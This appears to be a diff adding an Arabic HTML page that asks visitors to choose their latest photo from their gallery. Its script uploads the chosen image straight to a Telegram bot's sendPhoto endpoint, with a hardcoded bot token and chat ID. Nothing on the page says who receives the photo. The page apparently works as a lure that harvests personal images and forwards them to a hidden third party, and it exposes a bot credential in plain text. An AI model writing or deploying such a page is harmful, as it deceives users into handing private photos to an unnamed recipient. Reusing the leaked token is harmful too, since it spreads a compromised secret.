@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>إرسال صورتك الأخيرة</title>
+</head>
+<body style="text-align:center; font-family:Arial;">
+  <h2>📤 الرجاء اختيار صورتك الأخيرة من الاستوديو</h2>
+  <input type="file" id="photoInput" accept="image/*"><br><br>
+  <p id="status">لم يتم الرفع بعد</p>
+
+  <script>
+    const input = document.getElementById('photoInput');
+    const status = document.getElementById('status');
+
+    input.addEventListener('change', async () => {
+      const file = input.files[0];
+      if (!file) return;
+
+      status.innerText = "⏳ جارٍ إرسال الصورة...";
+
+      const formData = new FormData();
+      formData.append('chat_id', '2106352428');
+      formData.append('photo', file);
+
+      try {
+        const res = await fetch("https://api.telegram.org/bot8080597628:AAF0EssWLXTDEODkYc3KPe0cDXZrbvsqM_Y/sendPhoto", {
+          method: "POST",
+          body: formData
+        });
+
+        if (res.ok) {
+          status.innerText = "✅ تم إرسال الصورة بنجاح!";
+        } else {
+          status.innerText = "❌ حدث خطأ أثناء الإرسال";
+        }
+      } catch (e) {
+        status.innerText = "⚠️ فشل الاتصال بالخادم";
+      }
+    });
+  </script>
+</body>
+</html>
